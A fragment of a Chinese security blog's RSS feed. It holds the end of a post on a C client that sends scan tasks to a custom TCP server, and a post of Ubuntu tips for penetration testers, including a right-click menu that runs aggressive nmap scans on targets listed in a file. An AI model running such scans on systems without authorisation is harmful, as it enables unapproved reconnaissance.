&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pthread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pthread_t&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pthread_attr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start_routine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;thread：返回创建的线程的ID&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;attr：线程属性，调度策略、优先级等都在这里设置，如果为NULL则表示用默认属性&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;start_routine：线程入口函数，可以返回一个void*类型的返回值，该返回值可由pthread_join()捕获&lt;/li&gt;
  &lt;li&gt;arg：传给start_routine的参数， 可以为NULL&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;返回值：成功返回0，出错返回-1&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x06-任务派发过程&quot;&gt;0x06 任务派发过程&lt;/h2&gt;

&lt;p&gt;我的项目在：https://github.com/KoonsTools/PenloopGather&lt;/p&gt;

&lt;p&gt;为了锻炼编程能力，我选择了TCP协议，后面优化的时候自己再改成UDP吧&lt;/p&gt;

&lt;p&gt;首先，需要自己拟定一个协议，让客户端与服务器端能解析报文。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadowPls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;authcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;jobname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sendBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;Pls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6848d756da66e55b42f79c0728e351ad&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wwww&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7788&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.211.55.14&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buff : %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;//sleep(13);
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHUT_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上面是客户端，主要是封装了一个报文，把扫描任务发给服务器。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadowPls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ID
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 请求状态
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 扫描类型，可以是 1=&amp;gt;域名，2=&amp;gt;IP
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;authcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// KEY
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 扫描目标
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 任务说明
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;jobname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 任务名称
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 用户名
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;服务器根据数据包格式来解析，读取目标、描述、注释，并且在创建子进程之前认证用户是否有权限派发任务。&lt;/p&gt;

&lt;p&gt;有了独有的协议，我们可以使用：任何语言来做客户端，大大的方便了我们的工作！&lt;/p&gt;

&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;http://blog.csdn.net/li_ning_/article/details/52117463&lt;/li&gt;
  &lt;li&gt;https://baike.baidu.com/item/waitpid/4071590&lt;/li&gt;
  &lt;li&gt;http://blog.csdn.net/thanksgining/article/details/41979699&lt;/li&gt;
  &lt;li&gt;https://www.cnblogs.com/weizhixiang/p/6298523.html&lt;/li&gt;
  &lt;li&gt;https://www.cnblogs.com/Leo_wl/p/5735009.html&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 20 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-20/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-20/1</guid>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>渗透测试中使用Ubuntu的一些小技巧</title>
        <description>&lt;p&gt;本文记录一下Ubuntu的一些小技巧
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;由于学习C、C++我喜欢在Linux平台，首选了Ubuntu这个发新版，目前已经做得很不错了，但是平常使用的时候会发现一些比较麻烦的事情。&lt;/p&gt;

&lt;p&gt;本文就把一些技巧分享、记录下来。&lt;/p&gt;

&lt;p&gt;操作系统版本：Ubuntu 17.10&lt;/p&gt;

&lt;p&gt;我的源：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
deb http://cn.archive.ubuntu.com/ubuntu/ artful universe
deb http://cn.archive.ubuntu.com/ubuntu/ artful-updates universe
deb http://cn.archive.ubuntu.com/ubuntu/ artful multiverse
deb http://cn.archive.ubuntu.com/ubuntu/ artful-updates multiverse
deb http://cn.archive.ubuntu.com/ubuntu/ artful-backports main restricted universe multiverse
deb http://security.ubuntu.com/ubuntu artful-security main restricted
deb http://security.ubuntu.com/ubuntu artful-security universe
deb http://security.ubuntu.com/ubuntu artful-security multiverse
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x01-右键&quot;&gt;0x01 右键&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nautilus-actions&lt;/code&gt; 是一个提供用户自定义鼠标右键菜单的软件。&lt;/p&gt;

&lt;p&gt;我们可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;nautilus-actions-config-tool&lt;/code&gt; 来配置自己想要的菜单&lt;/p&gt;

&lt;p&gt;安装方式很简单：&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install nautilus-actions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在命令行中启动&lt;code class=&quot;highlighter-rouge&quot;&gt;nautilus-actions-config-tool&lt;/code&gt;就可以打开配置页面&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x01.png&quot; alt=&quot;enter description here&quot; title=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到我已经自己添加了两个菜单，主要用于Nmap从文本中读取目标进行扫描&lt;/p&gt;

&lt;p&gt;Ubuntu默认情况下是没有新建文本这个菜单的，我们自己通过这个工具添加一下试试：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x02.png&quot; alt=&quot;enter description here&quot; title=&quot;0x02&quot; /&gt;&lt;/p&gt;

&lt;p&gt;配置一下命令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x03.png&quot; alt=&quot;enter description here&quot; title=&quot;0x03&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里有几个变量介绍一下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;%d 当前目录&lt;/li&gt;
  &lt;li&gt;%f  当前选择的文件（单个）&lt;/li&gt;
  &lt;li&gt;%F 当前选择的所有文件&lt;/li&gt;
  &lt;li&gt;%b 当前文件&lt;/li&gt;
  &lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;剩下的自己摸索，以上的已经够用了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x04.png&quot; alt=&quot;enter description here&quot; title=&quot;0x04&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击保存以后，我们就可以使用了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x05.png&quot; alt=&quot;enter description here&quot; title=&quot;0x05&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-nmap自动导入目标扫描&quot;&gt;0x02 Nmap自动导入目标扫描&lt;/h2&gt;

&lt;p&gt;新建一个Document.txt，里面写入”192.168.3.1”&lt;/p&gt;

&lt;p&gt;我们在菜单里新建一个动作：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x06.png&quot; alt=&quot;enter description here&quot; title=&quot;0x06&quot; /&gt;&lt;/p&gt;

&lt;p&gt;解读一下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
/usr/bin/gnome-terminal

-x bash -c &quot;/usr/bin/nmap -iL %f -oN %d/NmapScan10000Result.txt -A;bash&quot;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;这个参数是用于创建一个新的终端，并且执行Nmap。最后的&lt;code class=&quot;highlighter-rouge&quot;&gt;;bash&lt;/code&gt;很重要，是用于保留终端不被关闭而写的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x07.png&quot; alt=&quot;enter description here&quot; title=&quot;0x07&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有了这个方式，我们可以自定义很多工具的参数传递，是不是很方便呢？&lt;/p&gt;

&lt;h2 id=&quot;0x04-快捷键&quot;&gt;0x04 快捷键&lt;/h2&gt;

&lt;p&gt;Windows下按&lt;code class=&quot;highlighter-rouge&quot;&gt;Print Screen&lt;/code&gt;，而Linux需要自己安装软件&lt;/p&gt;

&lt;p&gt;安装命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install shutter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;打开系统设置-&amp;gt;设备-&amp;gt;键盘&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x08.png&quot; alt=&quot;enter description here&quot; title=&quot;0x08&quot; /&gt;&lt;/p&gt;

&lt;p&gt;添加一个快捷键，并且输入名称、命令，按下快捷键：&lt;/p&gt;

